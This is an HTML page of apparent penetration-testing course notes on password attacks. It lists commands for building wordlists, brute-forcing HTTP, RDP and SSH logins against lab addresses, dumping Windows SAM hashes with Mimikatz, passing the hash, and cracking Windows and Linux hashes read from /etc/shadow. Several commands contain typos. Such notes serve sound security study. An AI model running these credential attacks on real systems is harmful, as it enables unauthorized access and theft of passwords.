<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Password attacks</title>
</head><body>Standard wordlists:<ul><li style="list-style-type: none">/usr/shared/wordlists</li>
</ul>
Custom wordlists:<ul><li style="list-style-type: none">cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</li>
</ul>
Password profiling and password enforcement policies with John the Ripper:<ul><li style="list-style-type: none">nano /etc/john/john.conf</li>
<li style="list-style-type: none">john --wordlist=megacorp-cewl.tx --rules --stdout &gt; mutated.txt</li>
</ul>
Bruteforce password attacks:<ul><li style="list-style-type: none">Bruteforce attacks can be very time consuming, very loud and not realistically viable, but they may make sense in case we know that the password for a certain user or organization follows a very specific pattern and enforcement policies. In this case we can generate our own ad-hoc bruteforce wordlist with crunch</li>
<li style="list-style-type: none">crunch wordlist generator: crunch 8 8 -t ,@@^^%%%</li>
</ul>
Common Network Service Attack Methods:<ul><li style="list-style-type: none">HTTP htaccess attack with Medusa:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</li>
<li style="list-style-type: none">medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rokyou.txt -M htttp -m DIR:/admin</li>
</ul>
</li>
<li style="list-style-type: none">Remote desktop protocol attack with Crowbar, a network authentication cracking tool:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Crowbar is one of the few tools to perform password attacks against the RDP service on modern versions of Windows</li>
<li style="list-style-type: none">sudo apt-get install crowar </li>
<li style="list-style-type: none">crowbar -b rdp -s 10.11.0.22/32 -u admin -C password-file.txt -n 1</li>
</ul>
</li>
<li style="list-style-type: none">SSH attack with THC-Hydra:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It can be used best to attach SSH and HTTP</li>
<li style="list-style-type: none">hydra -l kali -P password-file.txt ssh://127.0.0.1</li>
</ul>
</li>
<li style="list-style-type: none">HTTP POST attack with THC-Hydra:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&amp;pass=^PASS^ : INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou,txt -vV -f</li>
</ul>
</li>
</ul>
Leveraging password hashes:<ul><li style="list-style-type: none">Hash type identification: hashid blablabla</li>
<li style="list-style-type: none">Users" hashes:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Linus: /etc/shadow</li>
<li style="list-style-type: none">Windows: SAM (Security Accounts Manager)</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">LM hashes: not salted, weak and breakable with hash lookup attach</li>
<li style="list-style-type: none">NTLM hash: more secure, but still not salted</li>
<li style="list-style-type: none">The SAM database cannot be copied while the operating system is running. However, we can use Mimikatz against the lsass service:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">c:\tools\password_attacks\mimikatz.exe</li>
<li style="list-style-type: none">[mimikatz] privilege::debug</li>
<li style="list-style-type: none">[mimikatz] token::elevate</li>
<li style="list-style-type: none">[mimikatz] lsadump::sam</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
Passing the hash in Windows:<ul><li style="list-style-type: none">Passing the hashes in Windows (i.e. authenticating on multiple systems/services with username/hash instead of username/password) is possible because LM and NTLM hashes are not salted and hashes remain static over time</li>
<li style="list-style-type: none">passing-the-hash toolkit performs authentication via the SMB protocol:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">pth-winexe -U username%blablablahash //10.11.0.22 cmd</li>
</ul>
</li>
<li style="list-style-type: none">NTLM hashes are passed over the network in the form of Net-NTLM hashes</li>
</ul>
Windows password cracking:<ul><li style="list-style-type: none">If hashes are NOT salted, cracking is possible</li>
<li style="list-style-type: none">If hashes are salted, cracking is very very difficult, if not impossible</li>
<li style="list-style-type: none">In many real world scenarios, it is possible to capture both salt values and hashes to pass to the cracking sotfware (i.e. John the Ripper)</li>
<li style="list-style-type: none">John the Ripper:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Pure brute force of every possible password: john hash.txt --format=NT</li>
<li style="list-style-type: none">Using a wordlist: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT</li>
<li style="list-style-type: none">Using word mangling rules from /etc/john/john.conf: john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT</li>
</ul>
</li>
</ul>
Linux password cracking:<ul><li style="list-style-type: none">sudo grep victim /etc/passwd &gt; passwd-file.txt</li>
<li style="list-style-type: none">sudo grep victim /etc/shadow &gt; shadow-file.txt</li>
<li style="list-style-type: none">unshadow passwd-file.txt shadow-file.txt &gt; unshadowed-file.txt</li>
<li style="list-style-type: none">john --rules --wordlist=usr/share/wordlists/rockyou.txt unshadowed-file.txt</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
</body></html>